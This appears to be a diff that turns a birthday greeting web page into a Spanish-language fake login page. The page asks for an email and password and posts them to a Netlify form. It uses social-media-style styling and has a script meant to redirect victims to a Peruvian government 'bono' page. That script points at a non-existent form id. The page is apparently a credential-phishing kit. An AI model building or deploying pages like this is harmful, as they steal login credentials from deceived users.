@@ -1,36 +1,104 @@
+```html
 <!DOCTYPE html>
-<html lang="en">
-
+<html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-  <link rel="shortcut icon" type="image/png" href="img/favicon.png" />
-  <title>Feliz cumpleaños amor !! :)</title>
-  <!-- Google Font -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
-  <!-- Style -->
-  <link rel="stylesheet" href="./style/main.css" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Iniciar sesión</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:Arial, sans-serif;
+}
+
+body {
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+
+  background-image: url("/img/bg.png");
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+}
+.modal{
+  width:380px;
+  background:white;
+  padding:30px;
+  border-radius:12px;
+  box-shadow:0 10px 30px rgba(0,0,0,.2);
+}
+
+h2{
+  text-align:center;
+  margin-bottom:25px;
+}
+
+input{
+  width:100%;
+  padding:12px;
+  margin-bottom:15px;
+  border:1px solid #ddd;
+  border-radius:8px;
+}
+
+button{
+  width:100%;
+  padding:12px;
+  border:none;
+  border-radius:8px;
+  background:#fe2c55;
+  color:white;
+  cursor:pointer;
+  font-size:16px;
+}
+
+button:hover{
+  opacity:.9;
+}
+</style>
 </head>
-
 <body>
-  <!-- Background Music -->
-  <audio class="song" loop autoplay>
-    <source src="">
-    Your browser isn't invited for super fun audio time.
-  </audio>
 
-  <!-- All sections are rendered here dynamically from config.js -->
-  <div class="container"></div>
+<div class="modal">
+  <h2>Iniciar sesión</h2>
 
-  <!-- Libraries -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-  <!-- Config & Engine -->
-  <script src="./config.js"></script>
-  <script src="./script/main.js"></script>
+<form name="contacto" method="POST" data-netlify="true">
+  <input type="hidden" name="form-name" value="contacto">
+
+  <input
+    type="text"
+    name="nombre"
+    placeholder="Correo electronico"
+    required
+  >
+
+  <input
+    type="password"
+    name="email"
+    placeholder="Passoword"
+    required
+  >
+
+  <button type="submit">
+    Enviar
+  </button>
+</form>
+</div>
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", (e) => {
+  e.preventDefault();
+
+  window.location.href =
+  "https://www.gob.pe/12554-consulta-si-tu-hogar-recibira-el-bono-600";
+});
+</script>
+
 </body>
-
 </html>
+```
